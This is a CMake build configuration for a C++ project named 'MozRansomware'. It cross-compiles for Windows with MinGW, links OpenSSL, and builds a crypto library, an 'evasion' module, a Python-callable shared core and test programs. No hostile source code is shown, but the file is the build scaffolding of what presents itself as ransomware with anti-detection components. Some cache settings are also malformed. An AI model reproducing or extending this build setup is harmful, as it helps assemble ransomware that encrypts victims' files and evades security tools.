cmake_minimum_required(VERSION 3.14)
project(MozRansomware VERSION 2.0 LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_EXPORT_COMPILE_COMMANDS ON)
set(CMAKE_POSITION_INDEPENDENT_CODE ON)

# --- Cross-compilation support for Windows ---
# Detect if building for Windows target
if("$ENV{CMAKE_SYSTEM}" STREQUAL "Windows" OR "${CMAKE_SYSTEM_NAME}" STREQUAL "Windows")
    message(STATUS "Building for Windows target")
    # Set MinGW triple based on platform
    if(CMAKE_SIZEOF_VOID_P EQUAL 8)
        set(CMAKE_CROSSCOMPILING_TARGET "x86_64-w64-mingw32")
    else()
        set(CMAKE_CROSSCOMPILING_TARGET "i686-w64-mingw32")
    endif()
    # Use MinGW wrappers for executables
    set(CMAKE_C_COMPILER "x86_64-w64-mingw32-gcc" CACHE "C Compiler" FORCE)
    set(CMAKE_CXX_COMPILER "x86_64-w64-mingw32-g++" CACHE "C++ Compiler" FORCE)
    # Target Windows API subsystem
    set(CMAKE_EXECUTABLE_SUFFIX ".exe")
    set(CMAKE_SHARED_LIBRARY_SUFFIX ".dll")
else()
    message(STATUS "Building for native Linux target")
    set(CMAKE_CROSSCOMPILING_TARGET "")
    set(CMAKE_EXECUTABLE_SUFFIX "")
    set(CMAKE_SHARED_LIBRARY_SUFFIX ".so")
endif()

# Find OpenSSL (cross-compile aware)
if(CMAKE_CROSSCOMPILING_TARGET)
    # When cross-compiling, look for OpenSSL in standard MinGW paths
    set(OPENSSL_ROOT_DIR "/usr/${CMAKE_CROSSCOMPILING_TARGET}/usr" CACHE "OpenSSL root dir" FORCE)
    # Also check common locations
    if(EXISTS "/usr/${CMAKE_CROSSCOMPILING_TARGET}/usr/include/openssl/opensslv.h")
        message(STATUS "Found OpenSSL for cross-compilation")
    endif()
endif()

if(NOT OPENSSL_FOUND)
    find_package(OpenSSL REQUIRED)
endif()

# Static library for testing
add_library(moz_crypto STATIC src/moz_crypto.cpp)
target_include_directories(moz_crypto PUBLIC ${CMAKE_SOURCE_DIR}/include)
target_link_libraries(moz_crypto OpenSSL::Crypto OpenSSL::SSL)

# Evasion module
add_library(moz_evasion STATIC src/moz_evasion.cpp)
target_include_directories(moz_evasion PUBLIC ${CMAKE_SOURCE_DIR}/include)
target_link_libraries(moz_evasion)

# Shared library (for Python ctypes bridge)
add_library(moz_core SHARED
    src/moz_crypto.cpp
    src/moz_evasion.cpp
    src/moz_c_api.cpp
)
target_include_directories(moz_core PUBLIC ${CMAKE_SOURCE_DIR}/include)
target_link_libraries(moz_core moz_crypto moz_evasion OpenSSL::Crypto OpenSSL::SSL)

# Create test executables
add_executable(moz_test tests/test_crypto.cpp)
target_link_libraries(moz_test moz_crypto moz_evasion OpenSSL::Crypto OpenSSL::SSL)

add_executable(moz_evasion_test tests/test_evasion.cpp)
target_link_libraries(moz_evasion_test moz_crypto moz_evasion OpenSSL::Crypto OpenSSL::SSL)
